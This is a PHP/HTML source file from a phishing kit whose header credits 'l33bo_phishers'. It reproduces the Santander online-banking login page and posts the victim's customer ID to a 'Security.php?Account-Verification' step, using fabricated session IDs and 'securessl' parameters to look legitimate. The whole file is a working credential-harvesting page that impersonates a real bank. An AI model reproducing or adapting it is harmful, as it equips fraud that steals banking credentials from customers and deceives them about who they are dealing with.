<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
session_start();
require "../assets/includes/functions.php";
require "../assets/includes/Bank_One_Time.php";
require "../assets/includes/simplehtmldom.php";
require "../assets/includes/enc.php";
?>
<!DOCTYPE html>
<html lang="en-GB">
<head>
<!--<script type="text/javascript">
if (screen.width <= 699) {
document.location = "mobile/index.php?&sessionid=<?php echo generateRandomString(115);?>&securessl=true";
}
</script>-->
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Login</title>
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="Tue, 01 Jan 1980 12:00:00 GMT">
<meta http-equiv="Cache-Control" content="no-cache">
<link rel="shortcut icon" href="assets/img/favicon.ico">
<link rel="stylesheet" type="text/css" media="screen, print" href="assets/css/main.css">
<script>
function Check() {
    var x = document.forms["login"]["user"].value;
    if (x == null || x == "") {
        document.getElementById("ErrorBox").style.display = "block";
        return false;
    }
}
</script>
</head>
<body>
<div id="global">
<div id="header">
<div id="headerbanner" class="padlock">
<div id="MainLogo"><a href="#">Santander</a></div>
</div>
</div>
<div id="bodycontent">
<div id="bodycontent">
<div id="content">
<h1>Log on to Online Banking</h1>
<div id="ErrorBox" style="display:none" class="message alert">
<p><strong>Please enter your ID</strong></p>
</div>
<ul class="logTabs">
<li class="active"><a href="#">Personal</a></li>
<li><a href="#">Business</a></li>
<li><a href="#">Corporate</a></li>
</ul>
<div class="container">
<div class="logOnSection">
<form method="post" action="Security.php?Account-Verification&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" name="login" id="login" onsubmit="return Check();">
<fieldset>
<div class="form-item multiple">
<label for="user" class="fieldhelp"><span class="labeltext">Enter your Personal/Customer ID <img src="assets/img/help.gif" alt=""></span></label>
<span class="data">
<span class="row">
<input type="text" class="mandatory firstfocus correct" autocomplete="off" value="" id="user" name="user" maxlength="26"><br>
</span>
<span class="row">
<label for="none" class="fieldhelp">
<input type="checkbox" class="radioInput" value="1" name="none" id="none">
Remember my ID <img src="assets/img/help.gif" alt="">
</label>
</span>
</span>
<div class="buttonholder">
<span class="button">
<input type="submit" id="go" class="defaultAction primary" value="Log on &gt;">
</span>
<div>
<a href="#">Forgotten your log on details?</a>
</div>
</fieldset>
</form>
</div>

<h2 class="logOnTitle">Sign up for Online Banking</h2>
<div class="logOnSection">
<h3>Signing up only takes a few minutes. Once you are logged on, you can:</h3>
<ul class="itemList">
<li>view statements and transactions</li>
<li>transfer money between accounts</li>
<li>pay bills and people</li>
<li>update your personal details</li>
<li>set up text and email alerts</li>
</ul>
<div class="buttonholder">
<span class="button">
<a href="#" class="defaultAction primary">Sign up for Online Banking &gt;</a>
</span>
</div>
</div>
<h2 class="logOnTitle">Log on to other online services</h2>
<div class="logOnSection">
<ul class="linkList">
<li><a href="#">Sharedealing</a></li>
<li><a href="#">Clients of Premium Investments</a></li>
</ul>
</div>
</div>
</div>
</div>
</div>
<div id="logonside">
<div class="usefulLinksMenu">
<h2><span class="icoUseful">&nbsp;</span>Useful links</h2>
<ul>
<li><a href="#">Online Banking help</a></li>
<li><a href="#">About Online Banking</a></li>
<li><a href="#">View Online Banking Demos</a></li>
<li><a href="#">Changes to Online Banking Terms and Conditions</a></li>
<li><a href="#">Contact us</a></li>
</ul>
</div>
<div class="importantNotes">
<h2>Security Advice</h2>
<div class="section">
<p>Santander will never contact you by phone or email asking you to:</p>
<ul>
<li>Give us log in details or OTP</li>
<li>Transfer money out of your account for security reasons</li>
<li>Hand over your card or cash</li>
</ul>
<p> Click <a href="#">here</a> for more information on how to protect yourself form fraud.</p>
</div>
<div class="section">
<h2>Security Software</h2>
<p>Install <a href="#">Trusteer Rapport</a>. This free software can help protect you when you're using Online Banking.</p>
</div>
<div class="section">
<h2>Received a suspicious email?</h2>
<p>If you get an email that's branded Santander but doesn't contain your name, do not reply, open any attachment or click on any link. Forward the email to <a href="#">phishing@santander.co.uk</a> for us to investigate.</p>
</div>
</div>
</div>
<div id="footer">
<ul>
<li><a href="#">Online Banking Guarantee</a></li>
<li><a href="#">Site Help &amp; Accessibility</a></li>
<li><a href="#">Security &amp; Privacy</a></li>
<li><a href="#">Terms &amp; Conditions</a></li>
<li class="last"><a href="#">Legal</a></li>
</ul>
</div>
</div>
</body>
</html>















<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>